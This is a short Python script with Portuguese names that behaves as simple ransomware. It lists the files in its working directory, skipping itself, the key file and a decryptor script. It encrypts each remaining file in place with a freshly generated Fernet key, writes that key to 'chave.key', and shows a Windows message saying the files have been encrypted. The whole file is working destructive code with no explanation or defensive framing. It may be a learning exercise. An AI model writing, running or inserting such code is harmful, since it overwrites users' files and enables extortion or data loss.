import os
import subprocess
import fernet

listagem = os.listdir()
arquivosfoco = []

for f in listagem:
    if f == "ram.py" or f == 'chave.key' or f == 'decri.py':
        continue
    if os.path.isfile(f):
        arquivosfoco.append(f)

print(f"Arquivos encryptados : {arquivosfoco}")


chave = fernet.Fernet.generate_key()

with open("chave.key", "wb") as arquivokey:
    arquivokey.write(chave)

for f in arquivosfoco:
    with open(f, "rb") as alvo:
        conteudo = alvo.read()
        conteudocryp = fernet.Fernet(chave).encrypt(conteudo)
    with open(f, "wb") as alvo:
        alvo.write(conteudocryp)

subprocess.Popen("msg *                    SEUS ARQUIVOS FORAM ENCRYPTADOS          ")

